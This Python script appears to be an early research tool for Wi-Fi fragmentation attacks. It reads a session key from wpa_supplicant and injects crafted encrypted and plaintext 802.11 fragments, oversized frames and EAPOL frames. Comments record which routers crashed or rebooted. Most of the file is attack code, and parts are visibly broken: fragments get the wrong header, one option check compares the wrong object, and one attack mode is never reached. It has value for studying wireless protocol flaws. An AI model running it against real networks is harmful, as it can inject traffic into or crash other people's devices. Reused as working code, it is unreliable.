#!/usr/bin/env python3
from libwifi import *
import abc, sys, socket, struct, time, subprocess, atexit, select
from wpaspy import Ctrl

# NOTES:
# - The ath9k_htc devices by default overwrite the injected sequence number.
#   However, this number is not increases when the MoreFragments flag is set,
#   meaning we can inject fragmented frames (albeit with a different sequence
#   number than then one we use for injection this this script).
#   Overwriting the sequence can be avoided by patching `ath_tgt_tx_seqno_normal`
#   and commenting out the two lines that modify `i_seq`.

#MAC_STA2 = "d0:7e:35:d9:80:91"
#MAC_STA2 = "20:16:b9:b2:73:7a"
MAC_STA2 = "80:5a:04:d4:54:c4"

# ---------- Utility Commands ----------

def wpaspy_clear_messages(ctrl):
	# Clear old replies and messages from the hostapd control interface
	while ctrl.pending():
		ctrl.recv()

def wpaspy_command(ctrl, cmd):
	wpaspy_clear_messages(ctrl)
	rval = ctrl.request(cmd)
	if "UNKNOWN COMMAND" in rval:
		log(ERROR, "wpa_supplicant did not recognize the command %s. Did you (re)compile wpa_supplicant?" % cmd.split()[0])
		quit(1)
	elif "FAIL" in rval:
		log(ERROR, "Failed to execute command %s" % cmd)
		quit(1)
	return rval

class TestOptions():
	ForceFrag_EAPOL, Inject_LargeFrag, Attack_LinuxInject, Inject_Frag = range(4)

	def __init__(self):
		self.test = None
		self.interface = None

class Station(metaclass=abc.ABCMeta):
	# - Get an IP address of the other Station
	# - Connected events
	# - Getting the PTK
	# - Frame injection (to-DS field and MAC addresses)

	def __init__(self, options):
		self.options = options
		self.nic_iface = options.interface
		self.clientmac = None
		self.apmac = None

		# Note: some kernels don't support 15+ character interface names
		self.nic_mon = "mon" + self.nic_iface[:12]
		self.sock  = None
		self.daemon = None
		self.daemon_ctrl = None

		self.tk = None
		self.pn = 0x99

	@abc.abstractmethod
	def start_daemon(self):
		pass

	@abc.abstractmethod
	def set_frame_header(self, p):
		pass

	@abc.abstractmethod
	def handle_rx(self, p):
		pass

	@abc.abstractmethod
	def handle_wpaspy(self, msg):
		pass

	def get_tk(self):
		self.tk = wpaspy_command(self.daemon_ctrl, "GET tk")
		if self.tk == "none":
			self.tk = None
			log(STATUS, "No key being used")
		else:
			print(self.tk)
			self.tk = bytes.fromhex(self.tk)
			log(STATUS, "TK: " + self.tk.hex())

	def fragattack_linux(self):
		assert self.tk

		payload1 = b"A" * 16
		payload2 = b"B" * 16
		payload3 = b"C" * 16
		seqnum = 0xAA

		# Frame 1: encrypted normal fragment
		frag1 = Dot11(type="Data", FCfield="MF", SC=(seqnum << 4) | 0)/Raw(payload1)
		self.set_frame_header(frag1)
		frag1 = encrypt_ccmp(frag1, self.tk, self.pn)
		self.pn += 1

		# Frame 2: encrypted fragment with different CS but incremental PN.
		#	   sent fragmented to prevent receiving from processing it.
		frag2 = Dot11(type="Data", SC=((seqnum ^ 1) << 4) | 1)/Raw(payload2)
		self.set_frame_header(frag1)
		frag2 = encrypt_ccmp(frag2, self.tk, self.pn)
		self.pn += 1

		# Frame 3: plaintext fragment with same CS as the first encrypted fragment
		frag3 = Dot11(type="Data", SC=(seqnum << 4) | 1)/Raw(payload3)
		self.set_frame_header(frag1)

		sendp(RadioTap()/frag1, iface=self.nic_mon)
		sendp(RadioTap()/frag2, iface=self.nic_mon)
		sendp(RadioTap()/frag3, iface=self.nic_mon)

	def send_fragmented(self, header, data, num_frags):
		fragments = []
		fragsize = (len(data) + 1) // num_frags
		for i in range(num_frags):
			frag = header.copy()
			frag.SC |= i
			if i < num_frags - 1: frag.FCfield |= Dot11(FCfield="MF").FCfield

			payload = data[fragsize * i : fragsize * (i + 1)]
			frag = frag/Raw(payload)
			if self.tk:
				print("\n\tTODO: Double-check code to encrypted fragments!\n")
				frag = encrypt_ccmp(frag, self.tk, self.pn)
				self.pn += 1
			print(repr(frag))
			fragments.append(RadioTap()/frag)

		for i in range(100):
			time.sleep(0.2)
			sendp(fragments, iface=self.nic_mon)

	def inject_fragments(self, ping=False, num_frags=3, size=3000):
		if ping:
			# XXX TODO: How to automatically get IPs?
			data = raw(LLC()/SNAP()/IP(dst="192.168.4.100", src="192.168.4.101")/ICMP()/Raw("A" * size))
		else:
			# ========== Tests against APs ==========
			#
			# ath9k_htc:
			# - The WNDA3200 firmware crashes when sending a frame (as a client) of 2000+ bytes
			#
			# Values for WAG320 (Broadcom BCM4322):
			# - 1900-1988 caused the WAG320N to reboot when it was the first fragmented frame after boot,
			#             and without the second client being connected.
			#             Does work after sending initial short fragmented frame and with 2nd client being connected!
			# - 1995 is not forwarded to 2nd client, even after first sending smaller fragmented packets.
			# - Conclusion: can't force fragmention of frames, but perhaps vulnerable to memory-safety bugs.
			#
			# RT-N10 with TomatoUSB (Broadcom BCM5356):
			# - works: 1500, 1700, 1900, 1950, 1980 works
			# - To inject a frame of 1990 it was essential to use 4 fragments
			# - Anything higher than 1990 seems to fail
			# - Conclusion: maybe Broadcom has an issue with large Wi-Fi frames?
			#
			# Asus router:
			# - 1500: works when sending in two fargments
			# - 1600: does not work. Also not visible in tcpdump when the final destination MAC address is the AP,
			#         while for 1500 it then does also show in tcpdump (with final dst being AP).
			#         After updating the interace mtu using ip link, this still didn't work.
			# - 1700: does not work
			#
			# Nexus 5X hotspot:
			# - 2000,2300,2400,2500,3000 works
			# - 4000 phone receives it (checked with tcpdump). Crashes the Intel chip of the laptop...?
			# - 5/6/7/8/9/10/20/22k phone receives it (checked with tcpdump - no associated client to check Intel chip)
			#   When a client is connected, it cannot forward large frames though (not sent at all). We could send a
			#   frame to the client of size 2500 (as a single frame), but were unable to send 3000. When we disconnected
			#   the client, the frame did show up in tcpdump (if the client is connect it doesn't show up and seems to be
			#   immediately forwarded without reaching other parts of the network stack).
			# - Conclusion: it seems we cannot force fragmentation in this why against most devices.
			# - TODO: did we actually tested whether this would work against Linux?
			# - TODO: Maybe in client mode fragmented frames can cause crashes?
			#
			# TODO: Inject a very large (>2346 single-frame Wi-Fi frame)
			data = b"A" * size

		seqnum = 0xAA
		header = Dot11(type="Data", SC=(seqnum << 4))
		self.set_frame_header(header)
		self.send_fragmented(header, data, num_frags)

	def inject_eapol(self, numbytes=16):
		# This test is supposed to be executed before authenticating with the AP
		assert self.tk == None

		seqnum = 0xAA
		header = Dot11(type="Data", SC=(seqnum << 4))
		self.set_frame_header(header)
		data = raw(LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A" * 2600))
		self.send_fragmented(header, data, num_frags=2)

	# TODO: Might be good to put this into libwifi?
	def configure_interfaces(self):
		log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")

		# 0. Some users may forget this otherwise
		subprocess.check_output(["rfkill", "unblock", "wifi"])

		# 1. Remove unused virtual interfaces to start from a clean state
		subprocess.call(["iw", self.nic_mon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

		# 2. Configure monitor mode on interfaces
		subprocess.check_output(["iw", self.nic_iface, "interface", "add", self.nic_mon, "type", "monitor"])
		# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
		# sequence of commands assures the virtual interface is properly registered as a 802.11 monitor interface.
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		time.sleep(0.5)
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		subprocess.check_output(["ifconfig", self.nic_mon, "up"])

	def run(self):
		self.configure_interfaces()
		self.sock = MonitorSocket(type=ETH_P_ALL, iface=self.nic_mon)
		self.start_daemon()
		time.sleep(1)


		# Open the wpa_supplicant or hostapd control interface
		self.clientmac = scapy.arch.get_if_hwaddr(self.nic_iface)
		try:
			self.daemon_ctrl = Ctrl("wpaspy_ctrl/" + self.nic_iface)
			self.daemon_ctrl.attach()
		except:
			log(ERROR, "It seems wpa_supplicant/hostapd did not start properly, please inspect its output.")
			log(ERROR, "Did you disable Wi-Fi in the network manager? Otherwise it won't start properly.")
			raise

		# Configure things for the specific test we are running
		if self.options.test == TestOptions.ForceFrag_EAPOL:
			# Intercept EAPOL packets that the client wants to send
			wpaspy_command(self.daemon_ctrl, "SET ext_eapol_frame_io 1")

		# Monitor the virtual monitor interface of the client and perform the needed actions
		while True:
			sel = select.select([self.sock, self.daemon_ctrl.s], [], [], 1)

			if self.sock in sel[0]:
				p = self.sock.recv()
				if p != None: self.handle_rx(p)

			if self.daemon_ctrl.s in sel[0]:
				# XXX while self.daemon_ctrl.pending():
				msg = self.daemon_ctrl.recv()
				self.handle_wpaspy(msg)

	def stop(self):
		log(STATUS, "Closing Hostap daemon and cleaning up ...")
		if self.daemon:
			self.daemon.terminate()
			self.daemon.wait()
		if self.sock: self.sock.close()


	pass


class Authenticator(Station):
	pass


class Supplicant(Station):
	def __init__(self, options):
		super().__init__(options)

	def handle_rx(self, p):
		pass

	def set_frame_header(self, p):
		p.FCfield = Dot11(FCfield="to-DS").FCfield
		p.addr1 = self.apmac
		p.addr2 = self.clientmac
		p.addr3 = MAC_STA2

	def handle_wpaspy(self, msg):
		log(STATUS, "daemon: " + msg)

		if "Trying to authenticate with" in msg:
			# Example: "SME: Trying to authenticate with 00:0c:f6:22:d2:11 (SSID='mathynet' freq=2412 MHz)"
			p = re.compile("Trying to authenticate with (.*) \(SSID")
			self.apmac = p.search(msg).group(1)

		elif "CTRL-EVENT-CONNECTED" in msg:
			p = re.compile("Connection to (.*) completed")
			self.apmac = p.search(msg).group(1)
			self.get_tk()

			time.sleep(1)

			if self.options.test == TestOptions.Inject_Frag:
				self.inject_fragments(ping=True, num_frags=1, size=16)
			elif self.options == TestOptions.Inject_LargeFrag:
				self.inject_fragments(ping=False, num_frags=3, size=3000)

		elif "EAPOL-TX" in msg and self.options.test == TestOptions.ForceFrag_EAPOL:
			# XXX - Inject large EAPOL frame through AP to force fragmentation towards STA
			self.inject_eapol()

	def start_daemon(self):
		log(STATUS, "Starting wpa_supplicant ...")
		try:
			self.daemon = subprocess.Popen([
				"../wpa_supplicant/wpa_supplicant",
				"-Dnl80211",
				"-i", self.nic_iface,
				"-cclient.conf",
				"-dd"])
		except:
			if not os.path.exists("../wpa_supplicant/wpa_supplicant"):
				log(ERROR, "wpa_supplicant executable not found. Did you compile wpa_supplicant? Use --help param for more info.")
			raise


def cleanup():
	attack.stop()


def argv_pop_argument(argument):
	if not argument in sys.argv: return False
	idx = sys.argv.index(argument)
	del sys.argv[idx]
	return True


if __name__ == "__main__":
	if "--help" in sys.argv or "-h" in sys.argv:
		print("\nSee README.md for usage instructions.")
		quit(1)

	options = TestOptions()
	options.interface = sys.argv[1]

	# Parse the type of test variant to execute
	force_frag = argv_pop_argument("--force-frag")
	inject_largefrag = argv_pop_argument("--largefrag")
	attack_linux = argv_pop_argument("--attack-linux")
	if force_frag + inject_largefrag + attack_linux > 1:
		print("You can only select one test")
		quit(1)
	if force_frag:
		options.test = TestOptions.ForceFrag_EAPOL
	elif inject_largefrag:
		options.test = TestOptions.Inject_LargeFrag
	elif attack_linux:
		options.test = TestOptions.Attack_LinuxInject
	else:
		options.test = TestOptions.Inject_Frag

	# Parse remaining options
	while argv_pop_argument("--debug"):
		libwifi.global_log_level -= 1

	# Now start the tests
	attack = Supplicant(options)
	atexit.register(cleanup)
	attack.run()

